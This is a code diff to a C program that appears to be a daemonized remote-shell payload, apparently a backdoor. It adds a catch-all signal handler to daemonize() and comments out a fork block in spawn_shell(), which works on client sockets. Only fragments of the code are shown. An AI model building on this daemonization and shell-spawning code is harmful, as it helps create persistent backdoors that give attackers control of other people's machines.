@@ -12,6 +12,15 @@
 
 #include "../includes/payload.h"
 
+void handle_signals(int signum)
+{
+	// SIGCHILD -> do nothing
+	if (signum == 17)
+		return ;
+	(DEBUG) ? printf("error signal in payload") : 0;
+	exit(EXIT_FAILURE);
+}
+
 int daemonize(char* name, char* path, char* infile, char *outfile, char *errfile)
 {
 	pid_t pid;
@@ -39,9 +48,12 @@ int daemonize(char* name, char* path, char* infile, char *outfile, char *errfile
 	    exit(EXIT_FAILURE);
 	}
 	// Catch, ignore and handle signals
-    //TODO: Implement a real signal handler
-    signal(SIGCHLD, SIG_IGN);
-    signal(SIGHUP, SIG_IGN);
+    // Implement a real signal handler
+	struct sigaction action;
+	memset(&action, 0, sizeof(action));
+	action.sa_handler = handle_signals;
+	for (int i = 0; i < 32; ++i)
+    	sigaction(i, &action, 0);
 	// Fork off for the second time
     pid = fork();
     // An error occurred
@@ -222,7 +234,7 @@ int spawn_shell(int *clients_sockets)
 	}
 	send(*clients_sockets, "\n", 1, 0);
 	// parent fork again
-	int pid = fork();
+	/*int pid = fork();
 	if (pid < 0)
 	{
 		exit(EXIT_FAILURE);
@@ -233,7 +245,7 @@ int spawn_shell(int *clients_sockets)
 		waitpid(shell_pid, 0, 0);
 		*clients_sockets = -*clients_sockets;
 		exit(EXIT_SUCCESS);
-	}
+	}*/
 	return 0;
 }
 
